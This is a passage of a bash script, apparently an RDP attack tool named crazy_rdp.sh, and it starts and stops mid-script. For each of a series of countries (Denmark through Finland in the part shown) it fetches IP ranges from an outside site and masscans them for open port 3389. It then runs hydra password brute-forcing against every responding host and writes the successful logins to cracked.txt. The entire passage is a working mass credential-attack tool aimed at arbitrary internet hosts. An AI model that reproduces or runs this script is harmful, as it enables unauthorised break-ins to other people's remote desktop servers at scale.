read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "50" ]; then
curl http://ipdiapazon.16mb.com/Denmark.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "51" ]; then
curl http://ipdiapazon.16mb.com/Djibouti.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "52" ]; then
curl http://ipdiapazon.16mb.com/Dominican_republic.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "53" ]; then
curl http://ipdiapazon.16mb.com/Ecuador.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "54" ]; then
curl http://ipdiapazon.16mb.com/Egypt.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "55" ]; then
curl http://ipdiapazon.16mb.com/El_salvador.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "56" ]; then
curl http://ipdiapazon.16mb.com/Eritrea.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "57" ]; then
curl http://ipdiapazon.16mb.com/Estonia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "58" ]; then
curl http://ipdiapazon.16mb.com/Ethiopia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "59" ]; then
curl http://ipdiapazon.16mb.com/European_union.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "60" ]; then
curl http://ipdiapazon.16mb.com/Faroe_islands.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "61" ]; then
curl http://ipdiapazon.16mb.com/Fiji.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "62" ]; then
curl http://ipdiapazon.16mb.com/Finland.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "63" ]; then
